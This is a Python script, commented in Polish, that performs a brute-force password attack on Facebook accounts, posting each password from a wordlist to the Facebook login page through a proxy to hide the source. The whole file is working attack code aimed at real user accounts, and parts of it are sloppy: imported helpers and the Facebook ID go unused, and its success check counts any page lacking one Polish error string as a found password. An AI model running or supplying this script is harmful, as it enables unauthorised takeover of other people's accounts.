import requests
import time
import random
from bcrypt import checkpw

def verify_password(password, hashed_password):
    return checkpw(password.encode('utf-8'), hashed_password.encode('utf-8'))

def read_passwords_from_file(filename):
    with open(filename, 'r') as file:
        return file.read().splitlines()

def brute_force(username, fb_id, passwords, proxy):
    for password in passwords:
        # Wykonaj zapytanie do Facebooka z użyciem proxy
        response = requests.post('https://www.facebook.com/login.php', data={
            'email': username,
            'password': password,
            'login': 'Log In'
        }, proxies={'http': proxy, 'https': proxy})

        # Sprawdź odpowiedź
        if "Nieprawidłowe hasło" not in response.text:
            # Hasło zostało znalezione
            print('Znaleziono hasło:', password)
            return

        # Hasło nie zostało znalezione
        print('Nieprawidłowe hasło:', password)

def main():
    # Pobierz dane użytkownika
    username = input('Podaj nazwę użytkownika: ')
    fb_id = input('Podaj identyfikator Facebooka: ')

    # Pobierz nazwę pliku z listą haseł
    filename = input('Podaj nazwę pliku z listą haseł: ')

    # Wczytaj listę haseł z pliku
    passwords = read_passwords_from_file(filename)

    # Podaj adres proxy
    proxy = input('Podaj adres proxy (format: http://username:password@proxy_ip:proxy_port): ')

    # Wykonaj atak siłowy z użyciem proxy
    brute_force(username, fb_id, passwords, proxy)

if __name__ == '__main__':
    main()










